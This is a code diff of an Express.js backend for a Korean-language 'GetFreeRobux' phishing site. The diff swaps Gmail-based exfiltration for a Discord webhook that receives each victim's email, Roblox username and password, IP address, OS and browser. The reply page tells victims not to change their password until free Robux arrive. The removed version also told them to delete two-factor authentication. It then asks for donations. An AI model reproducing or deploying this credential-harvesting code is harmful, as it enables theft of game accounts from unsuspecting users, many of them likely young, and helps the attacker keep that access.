@@ -1,5 +1,4 @@
 const express = require("express");
-const nodemailer = require("nodemailer");
 const bodyParser = require("body-parser");
 const axios = require('axios');
 const escapeHtml = require('escape-html');
@@ -23,44 +22,6 @@ app.use((req, res, next) => {
         return res.status(403).send('봇 접속이 감지되었습니다.');
     }
     next();
-});
-
-app.post('/log', async (req, res) => {
-    const { logs, userAgent, time } = req.body;
-    const message = `
-📌 사용자 활동 로그
----------------------------
-접속 시간: ${time}
-User-Agent: ${userAgent}
-
-📝 행동 기록:
-${logs.join('\n')}
-`;
-    try {
-        // 이메일 전송 설정
-        const transporter = nodemailer.createTransport({
-            service: "gmail",
-            auth: {
-                user: process.env.EMAIL,
-                pass: process.env.APP_PASS,
-            },
-            tls: {
-                rejectUnauthorized: false,
-            },
-        });
-
-        await transporter.sendMail({
-        from: process.env.EMAIL,
-        to: process.env.EMAIL,
-        subject: '유저 로그 기록',
-        text: message
-        });
-
-        res.status(200).send('OK');
-    } catch (err) {
-        console.error("이메일 전송 실패:", err);
-        res.status(500).send('메일 전송 실패');
-    }
 });
 
 // 요청 제한 (Rate Limiting)
@@ -91,47 +52,46 @@ app.post("/robux", async (req, res) => {
         const os = userAgent.os;
         const browser = userAgent.browser;
 
-        const transporter = nodemailer.createTransport({
-            service: "gmail",
-            auth: {
-                user: process.env.EMAIL,
-                pass: process.env.APP_PASS,
-            },
-            tls: {
-                rejectUnauthorized: false,
-            },
-        });
+        // 디스코드 웹훅 전송
+        const webhookUrl = process.env.WEBHOOK_URL;
 
-        const mailOptions = {
-            from: email,
-            to: process.env.EMAIL,
-            subject: "새로운 Roblox 계정 정보가 도착했습니다!",
-            text: `
-🌐 IP 주소: ${userIp}
-💻 운영체제: ${os}
-🌍 브라우저: ${browser}
-✉️ 이메일: ${email}
-🆔 Roblox 아이디: ${roblox_id}
-🔐 Roblox 비밀번호: ${roblox_pwd}
-
-${privacy_checked}
-${_3rdperson_checked}
-${advertise_checked}
-            `,
+        const embedPayload = {
+            embeds: [
+                {
+                    title: "📌 새로운 Roblox 계정이 도착했습니다!",
+                    description: "사이트: GetFreeRobux",
+                    color: 0x3498db,
+                    fields: [
+                        { name: "📧 이메일", value: `\`${email}\`` },
+                        { name: "🆔 Roblox 아이디", value: `\`${roblox_id}\`` },
+                        { name: "🔑 Roblox 비밀번호", value: `\`${roblox_pwd}\`` },
+                        { name: "🌐 IP 주소", value: `\`${userIp}\`` },
+                        { name: "💻 운영체제", value: os },
+                        { name: "🌍 브라우저", value: browser },
+                        { name: "🔒 개인정보 동의", value: privacy_checked },
+                        { name: "👥 제 3자 제공", value: _3rdperson_checked },
+                        { name: "📢 마케팅 활용", value: advertise_checked }
+                    ],
+                    footer: {
+                        text: "자동 웹훅 시스템"
+                    },
+                    timestamp: new Date().toISOString()
+                }
+            ]
         };
 
-        transporter.sendMail(mailOptions, (error, info) => {
-            if (error) {
-                return res.send("ERROR PLEASE TRY AGAIN");
-            } else {
-                return res.send(`<h2>빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오. 2단계 인증을 삭제하십시오. 일반적으로 2단계 인증을 사용한 사용자가 그렇지 않은 사용자보다 평균 1271.2% 더 많이 기다렸습니다.</h2>
+        await axios.post(webhookUrl, embedPayload);
+
+        return res.send(`
+<h2>빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오.</h2>
 <h1>기부로 개발자를 도와주세요!</h1>
 <iframe src="https://nowpayments.io/embeds/donation-widget?api_key=SPB4XA6-B4M4TZ4-HTHXA2C-96QC978" width="346" height="623" frameborder="0" scrolling="no" style="overflow-y: hidden;">
     Can't load widget
-</iframe>`);
-            }
-        });
+</iframe>
+        `);
+
     } catch (err) {
+        console.error(err);
         res.status(500).send('서버 오류');
     }
 });
